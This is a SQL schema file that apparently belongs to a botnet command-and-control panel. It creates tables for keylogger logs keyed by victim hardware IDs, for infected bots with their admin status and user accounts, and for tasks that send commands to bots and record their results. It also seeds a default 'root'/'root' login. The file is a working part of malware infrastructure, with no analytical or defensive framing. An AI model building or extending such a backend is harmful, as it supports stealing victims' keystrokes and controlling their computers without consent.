

CREATE TABLE IF NOT EXISTS `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(100) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=1;
CREATE TABLE IF NOT EXISTS `keylogger_logs`(
	`id` int(11) NOT NULL AUTO_INCREMENT,
	`HWID` varchar(100) NOT NULL,
	`keylog_data` varchar(100) NOT NULL,
	`keylog_last_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
	PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=1;
CREATE TABLE IF NOT EXISTS `bots` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `HWID` varchar(100) NOT NULL,
  `admin_status` varchar(100) NOT NULL, 
  `User_Account` varchar(100) NOT NULL,
  `last_seen` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=1;
CREATE TABLE IF NOT EXISTS `tasks` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `HWID` varchar(255) DEFAULT NULL, 
  `cmd_num` varchar(255) NOT NULL,
  `cmd` varchar(255) DEFAULT NULL,
  `executed` int(10) DEFAULT '0',
  `failed` int(10) DEFAULT '0',
  `maxbots` int(10) DEFAULT '0',
  `time_added` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `status` int(10) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1;
CREATE TABLE IF NOT EXISTS `complete_tasks` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `cmd_id` varchar(255) NOT NULL,
  `result` int(10) NOT NULL,
  `HWID` varchar(255) NOT NULL,
  `time_executed` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1;


INSERT INTO `users` (`id`, `username`, `password`) VALUES
(1, 'root', 'root');
